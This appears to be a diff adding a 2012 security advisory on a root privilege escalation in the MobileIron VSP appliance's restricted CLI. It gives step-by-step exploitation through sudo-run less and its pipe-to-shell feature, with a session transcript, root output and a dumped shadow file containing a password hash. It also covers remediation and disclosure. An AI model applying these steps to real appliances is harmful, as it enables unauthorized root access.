@@ -1,0 +1,94 @@
+MobileIron Virtual Smartphone Platform Privilege Escalation Exploit 0day
+========================================================================
+The MobileIron Virtual Smartphone Platform is the first solution to combine data-driven
+smartphone and tablet management with real-time wireless cost control. The MDM solution 
+provides an appliance which can be configured through a restrictive web and management 
+shell. A command injection vulnerability within the telnet/SSH shell allows for elevation
+of privileges to "root" from the low privileged user as well as escaping the restrictive shell.
+
+* Description
+The MobileIron VSP appliance provides a restricted "clish" java application that can be used 
+for performing a minimal amount of configuration and requires an "enable" password for elevated
+privileges. Probing under the hood of this shell indicates that certain commands are run in 
+the native linux OS with sudo, by using the "show processes" command you can see the commands being used.
+
+miadmin  13353  0.0  0.0  63856  1388 pts/1    S+   14:45   0:00 /bin/bash /mi/bin/cli-view-log --log mi.log
+root     13399  0.0  0.0 104096  2144 pts/1    S+   14:45   0:00 /usr/bin/sudo /usr/bin/less mylnk
+root     13400  0.0  0.0  63600  1024 pts/1    S+   14:45   0:00 /usr/bin/less mylnk
+
+The above command can be triggered from the miadmin user with the "show log" functoinality, 
+as "/usr/bin/less" is then called with root privileges it is possible to quickly elevate 
+privileges to root using !sh as seen in the example here:
+
+root@bt:~/MobileIron# ssh -l miadmin 10.x.x.x
+miadmin@10.x.x.x's password: 
+Last login: Tue Sep 18 14:33:19 2012 from 10.x.x.x
+************************************************************
+*                    MobileIron VSP CLI                    *
+*                                                          *
+*                                                          *
+************************************************************
+Welcome miadmin it is Tue Sep 18 14:38:46 UTC 2012
+vsp@hostname.victim> show log mi.log
+--log 'mi.log' --
+************************************************************
+*                    MobileIron VSP CLI                    *
+*                                                          *
+*                                                          *
+************************************************************
+Welcome root it is Tue Sep 18 14:38:58 UTC 2012
+vsp@hostname.victim> 
+
+As less supports the ability of executing arbitrary commands and piping input it is trivial to 
+gain arbitrary command execution by using pipe with the current file "|m." which will change the 
+less prompt to "!" indicating which program to pipe to and then typing /bin/sh -c "CMD YOU WANT"
+to be able to execute arbitrary commands with root privileges. You will recieve the command
+output.
+
+--log 'mi.log' --
+Linux hostname.victim 2.6.18-308.1.1.el5 #1 SMP Wed Mar 7 04:16:51 EST 2012 x86_64 x86_64 x86_64 GNU/Linux
+uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel)
+vsp@hostname.victim> 
+
+By reviewing the host we can determine that mobileiron also provide a default root username with 
+the password of "admin" in a disabled state (damn...) and a hidden user of "misupport".
+
+root:!!$1$3FrxHucD$JL4zVWemZeZJY9LY3PruJ1:15544:0:99999:7:::
+bin:*:15544:0:99999:7:::
+daemon:*:15544:0:99999:7:::
+adm:*:15544:0:99999:7:::
+lp:*:15544:0:99999:7:::
+sync:*:15544:0:99999:7:::
+shutdown:*:15544:0:99999:7:::
+halt:*:15544:0:99999:7:::
+mail:*:15544:0:99999:7:::
+news:*:15544:0:99999:7:::
+uucp:*:15544:0:99999:7:::
+operator:*:15544:0:99999:7:::
+games:*:15544:0:99999:7:::
+gopher:*:15544:0:99999:7:::
+ftp:*:15544:0:99999:7:::
+nobody:*:15544:0:99999:7:::
+distcache:!!:15544:0:99999:7:::
+vcsa:!!:15544:0:99999:7:::
+pcap:!!:15544:0:99999:7:::
+ntp:!!:15544:0:99999:7:::
+dbus:!!:15544:0:99999:7:::
+mailnull:!!:15544:0:99999:7:::
+smmsp:!!:15544:0:99999:7:::
+apache:!!:15544:0:99999:7:::
+sshd:!!:15544:0:99999:7:::
+haldaemon:!!:15544:0:99999:7:::
+mysql:!!:15544::::::
+postgres:!!:15544::::::
+tomcat:!!:15544::::::
+clamav:!!:15544:0:99999:7:::
+misupport:!!:15544:0:99999:7:::
+miadmin:CENSORED:15544:0:99999:7:::
+
+Remedial Action
+Disable the use of telnet and SSH on VSP appliances and ensure that strong passwords are set for 
+the miadmin account or be assured that all shell users of VSP appliance can obtain full root
+privileges until a fix is made available. This issue was reported to MobileIron on September 19th 
+2012 and given a Moderate risk rating. An expected firmware update has been advised that it will
+be available within 3 months of the reporting date.
